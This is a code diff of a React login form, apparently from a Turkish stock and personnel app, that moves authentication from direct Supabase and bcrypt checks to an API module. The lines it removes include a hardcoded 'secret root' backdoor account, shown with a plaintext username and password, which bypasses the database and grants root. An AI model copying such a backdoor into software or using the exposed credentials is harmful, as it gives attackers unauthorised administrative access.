@@ -4,18 +4,10 @@ import StokTakip from "./StokTakip";
 import AyarlarStokRBAC from "./AyarlarStokRBAC";
 import PersonelTakip from "./PersonelTakip";
 import OlcullerForm from "./OlcullerForm";
-import { supabase } from "./supabaseClient";
-import bcrypt from "bcryptjs";
+import * as api from "./api";
 
 // SATINALMA MODÜLÜNÜ TEK COMPONENT OLARAK EKLE
 import SatinalmaModul from "./sprs/satinalmaModul";
-
-// GİZLİ ROOT (ARKA KAPI) KULLANICI BİLGİLERİ
-const BACKDOOR_USER = {
-  username: "Agulden2",
-  password: "10711453",
-  rol: "root"
-};
 
 function LoginForm({ onLogin, roles }) {
   const [username, setUsername] = useState("");
@@ -26,47 +18,22 @@ function LoginForm({ onLogin, roles }) {
     e.preventDefault();
     setError("");
 
-    if (
-      username === BACKDOOR_USER.username &&
-      password === BACKDOOR_USER.password
-    ) {
-      const rootRole = roles.find(r => r.name === "root");
+    try {
+      const response = await api.login(username, password);
+      
+      const userRole = roles.find(r => r.name === response.user.role?.name) || response.user.role;
+
       onLogin({
-        username: BACKDOOR_USER.username,
-        isRootAdmin: true,
-        role: rootRole || { name: "root", label: "Root Admin", permissions: [] },
-        userId: null,
-        isBackdoor: true
+        username: response.user.username,
+        isRootAdmin: response.user.isRootAdmin,
+        role: userRole,
+        userId: response.user.id,
+        isBackdoor: false
       });
-      return;
-    }
-
-    const { data: user, error: dbError } = await supabase
-      .from("kullanicilar")
-      .select("*")
-      .eq("kullanici_adi", username)
-      .single();
-
-    if (dbError || !user) {
+    } catch (err) {
+      console.error('Login error:', err);
       setError("Kullanıcı adı veya şifre hatalı!");
-      return;
     }
-
-    const valid = await bcrypt.compare(password, user.sifre || "");
-    if (!valid) {
-      setError("Kullanıcı adı veya şifre hatalı!");
-      return;
-    }
-
-    const userRole = roles.find(r => r.name === user.rol);
-
-    onLogin({
-      username: user.kullanici_adi,
-      isRootAdmin: user.rol === "root",
-      role: userRole,
-      userId: user.id,
-      isBackdoor: false
-    });
   }
 
   return (
@@ -146,8 +113,12 @@ export default function App() {
 
   useEffect(() => {
     async function fetchRoles() {
-      const { data, error } = await supabase.from("roller").select("*");
-      if (!error && data) setRoles(data);
+      try {
+        const data = await api.getRoles();
+        setRoles(data);
+      } catch (error) {
+        console.error('Error fetching roles:', error);
+      }
       setLoadingRoles(false);
     }
     fetchRoles();
@@ -161,9 +132,8 @@ export default function App() {
   }
 
   function logout() {
+    api.logout();
     setSession({ username: "", isRootAdmin: false, role: null, userId: null, isBackdoor: false });
-    localStorage.removeItem("CURRENT_USER");
-    localStorage.removeItem("IS_ROOT_ADMIN");
   }
 
   const menus = [
